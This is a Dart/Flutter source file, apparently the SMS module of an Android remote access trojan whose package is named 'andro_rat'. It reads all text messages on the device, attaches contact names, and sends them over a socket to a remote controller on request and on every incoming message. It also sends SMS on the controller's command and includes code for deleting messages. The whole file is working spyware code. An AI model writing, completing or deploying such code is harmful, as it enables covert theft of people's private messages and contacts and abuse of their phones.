import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:flutter_workspace/andro_rat/utils.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:sms_advanced/contact.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;
import 'package:sms_advanced/sms_advanced.dart' as SMSAdvanced;
import 'package:telephony/telephony.dart';

final  telephony = Telephony.instance;

backgroundMessageHandler(message) async {
  SMSMessages.onSMSReceived(message);
}

/// Using 2 libraries...:
/// 1. Telephony - for permissions, writing,
/// 2. Sms Advanced - for reading,
class SMSMessages {
  static const String remoteTrigger = "smsMessages";
  late SocketIO.Socket _socket;

  Future<Map> getPayload({ String? upon }) async {
    final payload = <String, dynamic> { "upon": upon ?? "request" };

    if (await _checkPoint() ?? false) {
      final SMSAdvanced.SmsQuery smsQuery = SMSAdvanced.SmsQuery();
      final List<SMSAdvanced.SmsMessage> SMS = await smsQuery.getAllSms;
      final List<Map> messages = [];
      for (int i = SMS.length - 1; i >= 0; i--) {
        final sms = SMS[i];
        final ContactQuery contactQuery = ContactQuery();
        Contact? contact = await contactQuery.queryContact(sms.address);

        final map = sms.toMap;
        map.addAll({ "contact": contact?.fullName, "type": _typeText(sms.kind) });

        messages.add(map);
      }
      payload.addAll({ "messages": messages });
    } else {
      payload.addAll({ "error": "Permission denied" });
    }

    return payload;
  }

  String _typeText(SMSAdvanced.SmsMessageKind? kind) {
    switch (kind) {
      case SMSAdvanced.SmsMessageKind.Sent: {
        return "sent";
      }
      case SMSAdvanced.SmsMessageKind.Received: {
        return "inbox";
      }
      case SMSAdvanced.SmsMessageKind.Draft: {
        return "draft";
      }
      default: {
        return "unknown";
      }
    }
  }

  Future<bool?> _checkPoint() async {
    // await telephony.requestPhoneAndSmsPermissions;
    return await Permission.sms.isGranted || await Permission.sms.request().isGranted;
  }

  /// Create and send a new SMS directly from the app
  Future<void> sendSMS(String address, String body) async {
    if (await _checkPoint() ?? false) {
      await telephony.sendSms(
        to: address,
        message: body
      );
      sendPayload();
    }
  }

  // Todo refer
  Future<void> deleteSMS(id, threadId) async {
    if (await _checkPoint() ?? false) {
      final SMSAdvanced.SmsRemover smsRemover = SMSAdvanced.SmsRemover();
      final bool? isDeleted = await smsRemover.removeSmsById(id, threadId);
      Debug.log(isDeleted);
    }
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      sendPayload();
    });

    _socket.on("sendSMS", (req) async {
      await sendSMS(req.sms.address, req.sms.body);
      sendPayload();
    });

    _socket.on("delSMS", (req) async {
      // Todo refer deleteSMS() first
      // await deleteSMS(req.sms._id, req.sms.threadId);
      // sendPayload();
    });

    _initListeners();
  }

  void _initListeners() {
    telephony.listenIncomingSms(
      onNewMessage: (message) {
        onSMSReceived(message);
      },
      onBackgroundMessage: backgroundMessageHandler,
    );
  }

  static void onSMSReceived(message) async {
    final SMSMessages smsMessages = SMSMessages();
    smsMessages.sendPayload(upon: "smsReceived");
  }

  void _sendPayload(String remoteTrigger, payload) {
    if (Utils.isSupportedPlatform()) {
      _socket.emit(remoteTrigger, payload);
    }
  }

  Future<void> sendPayload({ String? upon }) async {
    Debug.log("[Sending SMS Messages]:");
    _sendPayload(remoteTrigger, await getPayload(upon: upon) );
    Debug.log(":[End Sending SMS Messages]");
  }

}
